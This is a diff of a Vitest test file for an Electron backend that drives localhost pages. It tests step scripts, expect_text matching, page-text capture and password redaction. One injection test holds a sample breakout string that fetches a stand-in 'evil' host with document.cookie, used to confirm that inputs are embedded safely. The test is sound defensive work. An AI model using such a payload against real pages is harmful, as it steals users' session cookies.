@@ -1,10 +1,17 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
 // A fake BrowserWindow just deep enough to drive the capture backend: it records
-// the page scripts it is asked to run (answering from `results`, else 'ok') and
-// the input events sent to it, and finishes loading as soon as loadURL is called.
+// the step scripts it is asked to run (answering from `results`, then `fallback`)
+// and the input events sent to it, answers the page-text read with `pageText`, and
+// finishes loading as soon as loadURL is called.
 const fake = vi.hoisted(() => {
-  const state = { results: [] as unknown[], scripts: [] as string[], inputs: [] as unknown[] }
+  const state = {
+    results: [] as unknown[],
+    fallback: 'ok' as unknown,
+    pageText: '' as unknown,
+    scripts: [] as string[],
+    inputs: [] as unknown[]
+  }
   class FakeWebContents {
     private handlers = new Map<string, (...args: unknown[]) => void>()
     on(event: string, fn: (...args: unknown[]) => void): this {
@@ -26,8 +33,9 @@ const fake = vi.hoisted(() => {
       return false
     }
     async executeJavaScript(script: string): Promise<unknown> {
+      if (script.includes('b.innerText.slice(')) return state.pageText
       state.scripts.push(script)
-      return state.results.length ? state.results.shift() : 'ok'
+      return state.results.length ? state.results.shift() : state.fallback
     }
     sendInputEvent(event: unknown): void {
       state.inputs.push(event)
@@ -54,10 +62,17 @@ const fake = vi.hoisted(() => {
 })
 vi.mock('electron', () => ({ BrowserWindow: fake.BrowserWindow, session: fake.session }))
 
-const { INVALID_SELECTOR, PRESS_INPUT, stepScript, visibleScript, wireLocalhostCapture } = await import(
-  './localhostCapture'
-)
-const { PRESS_KEYS, captureLocalhost, resetCaptureBackend } = await import('./agent/viewlocalhost')
+const {
+  INVALID_SELECTOR,
+  PAGE_TEXT_SCRIPT,
+  PRESS_INPUT,
+  expectTextError,
+  stepScript,
+  textScript,
+  visibleScript,
+  wireLocalhostCapture
+} = await import('./localhostCapture')
+const { PRESS_KEYS, REDACTED_PASSWORD, captureLocalhost, resetCaptureBackend } = await import('./agent/viewlocalhost')
 
 describe('step scripts', () => {
   it('embeds selector and value as JSON literals, so they cannot break out', () => {
@@ -85,6 +100,12 @@ describe('step scripts', () => {
     expect(s).toContain("getOwnPropertyDescriptor(Object.getPrototypeOf(el), 'value')")
     expect(s).toContain("new Event('input', { bubbles: true })")
     expect(s).toContain("new Event('change', { bubbles: true })")
+  })
+
+  it('tells the backend when a fill typed into a password field', () => {
+    expect(stepScript({ action: 'fill', selector: '#x', value: 'v' })).toContain(
+      `el.type === 'password' ? "ok:password" : 'ok'`
+    )
   })
 
   it('reports an invalid selector from inside the page instead of throwing', () => {
@@ -130,6 +151,42 @@ describe('step scripts', () => {
     expect(s).toContain("document.activeElement.type === 'file'")
   })
 
+  it('matches expect_text on visible rendered text, whitespace- and case-insensitively', () => {
+    const s = textScript({ action: 'expect_text', text: 'Buy  Milk', absent: false, timeoutMs: 1 })
+    expect(s).toContain(JSON.stringify('Buy  Milk'))
+    expect(s).toContain("replace(/\\s+/g, ' ').trim().toLowerCase()")
+    expect(s).toContain('el.innerText')
+    expect(s).toContain('el.checkVisibility({ visibilityProperty: true })')
+    // Page-wide without a selector, every matching element with one.
+    expect(s).toContain('const els = document.body ? [document.body] : [];')
+    const scoped = textScript({ action: 'expect_text', text: 'x', selector: '.todo li', absent: false, timeoutMs: 1 })
+    expect(scoped).toContain(`document.querySelectorAll(${JSON.stringify('.todo li')})`)
+    expect(scoped).toContain("catch { return 'invalid'; }")
+  })
+
+  it('embeds expect_text text and selector as JSON literals, so they cannot break out', () => {
+    const evil = `"); fetch("http://evil/"+document.cookie); ("`
+    const s = textScript({ action: 'expect_text', text: evil, selector: evil, absent: false, timeoutMs: 1 })
+    expect(s.split(JSON.stringify(evil)).length - 1).toBe(2)
+    expect(s).not.toContain(`norm("${evil}")`)
+  })
+
+  it('explains an expect_text failure from the last check', () => {
+    const step = { action: 'expect_text' as const, text: 'x', absent: false, timeoutMs: 3000 }
+    expect(expectTextError(step, 'missing')).toBe('the text is not visible within 3000ms')
+    expect(expectTextError(step, undefined)).toBe('the text is not visible within 3000ms')
+    expect(expectTextError({ ...step, absent: true }, 'found')).toBe('the text is still visible after 3000ms')
+    expect(expectTextError({ ...step, selector: 'li' }, 'none')).toBe('no visible element matches the selector')
+    expect(expectTextError({ ...step, absent: true, selector: 'li' }, 'none')).toBe(
+      'no visible element matches the selector'
+    )
+    expect(expectTextError(step, 'none')).toBe('the page has no visible body')
+  })
+
+  it('reads page text from the rendered body only, capped in the page', () => {
+    expect(PAGE_TEXT_SCRIPT).toContain('b.getClientRects().length ? b.innerText.slice(0, 50000)')
+  })
+
   it('checks visibility, not just presence, for wait_for', () => {
     const s = visibleScript('.dashboard')
     expect(s).toContain('getBoundingClientRect')
@@ -148,10 +205,12 @@ describe('press key mapping', () => {
   })
 })
 
-describe('press steps in the Electron backend', () => {
+describe('steps in the Electron backend', () => {
   beforeEach(() => {
     vi.useFakeTimers()
     fake.state.results = []
+    fake.state.fallback = 'ok'
+    fake.state.pageText = ''
     fake.state.scripts = []
     fake.state.inputs = []
     wireLocalhostCapture()
@@ -215,5 +274,105 @@ describe('press steps in the Electron backend', () => {
     expect(cap.steps).toEqual([
       { step: `wait for "button:has-text('All')"`, ok: false, error: INVALID_SELECTOR }
     ])
+  })
+})
+
+describe('expect_text and page text in the Electron backend', () => {
+  beforeEach(() => {
+    vi.useFakeTimers()
+    fake.state.results = []
+    fake.state.fallback = 'ok'
+    fake.state.pageText = ''
+    fake.state.scripts = []
+    fake.state.inputs = []
+    wireLocalhostCapture()
+  })
+  afterEach(() => {
+    vi.useRealTimers()
+    resetCaptureBackend()
+  })
+
+  const capture = async (
+    steps: Parameters<typeof captureLocalhost>[0]['steps']
+  ): ReturnType<typeof captureLocalhost> => {
+    const p = captureLocalhost({ url: 'http://localhost:3000', steps })
+    await vi.runAllTimersAsync()
+    return p
+  }
+  const expectText = (over: { absent?: boolean; selector?: string } = {}) => ({
+    action: 'expect_text' as const,
+    text: 'Buy milk',
+    absent: over.absent ?? false,
+    timeoutMs: 1000,
+    ...(over.selector ? { selector: over.selector } : {})
+  })
+
+  it('passes once the text shows up', async () => {
+    fake.state.results = ['missing', 'missing', 'found']
+    const cap = await capture([expectText()])
+    expect(cap.steps).toEqual([{ step: 'expect text "Buy milk"', ok: true }])
+    expect(fake.state.scripts).toHaveLength(3)
+  })
+
+  it('fails when the text never shows up', async () => {
+    fake.state.fallback = 'missing'
+    const cap = await capture([expectText(), { action: 'press', key: 'Enter' }])
+    expect(cap.steps).toEqual([
+      { step: 'expect text "Buy milk"', ok: false, error: 'the text is not visible within 1000ms' }
+    ])
+  })
+
+  it('passes absent once the text is gone, and fails while it stays', async () => {
+    fake.state.results = ['found', 'missing']
+    expect((await capture([expectText({ absent: true })])).steps).toEqual([
+      { step: 'expect no text "Buy milk"', ok: true }
+    ])
+    fake.state.scripts = []
+    fake.state.fallback = 'found'
+    expect((await capture([expectText({ absent: true })])).steps).toEqual([
+      { step: 'expect no text "Buy milk"', ok: false, error: 'the text is still visible after 1000ms' }
+    ])
+  })
+
+  it('never passes absent vacuously when the scope matches nothing', async () => {
+    fake.state.fallback = 'none'
+    const cap = await capture([expectText({ absent: true, selector: '.todo-lsit li' })])
+    expect(cap.steps).toEqual([
+      {
+        step: 'expect no text "Buy milk" in ".todo-lsit li"',
+        ok: false,
+        error: 'no visible element matches the selector'
+      }
+    ])
+  })
+
+  it('fails at once on an unparseable scope selector', async () => {
+    fake.state.results = ['invalid']
+    const cap = await capture([expectText({ selector: "li:contains('Buy')" })])
+    expect(cap.steps?.[0]).toMatchObject({ ok: false, error: INVALID_SELECTOR })
+    expect(fake.state.scripts).toHaveLength(1)
+  })
+
+  it('returns the page text after the steps', async () => {
+    fake.state.pageText = 'todos\n\n  Buy milk  \n1 item left'
+    const cap = await capture([{ action: 'press', key: 'Enter' }])
+    expect(cap.pageText).toBe('todos\nBuy milk\n1 item left')
+  })
+
+  it('omits the page text when the read returns something other than text', async () => {
+    fake.state.pageText = undefined
+    const cap = await capture([])
+    expect('pageText' in cap).toBe(false)
+  })
+
+  it('scrubs a value typed into a password field from the page text, but not other fills', async () => {
+    fake.state.results = ['ok:password', 'ok']
+    fake.state.pageText = 'Hi alice@example.test, your password is test-only-pass'
+    const cap = await capture([
+      { action: 'fill', selector: '#password', value: 'test-only-pass' },
+      { action: 'fill', selector: '#email', value: 'alice@example.test' }
+    ])
+    expect(cap.steps?.every((s) => s.ok)).toBe(true)
+    expect(cap.pageText).toBe(`Hi alice@example.test, your password is ${REDACTED_PASSWORD}`)
   })
 })
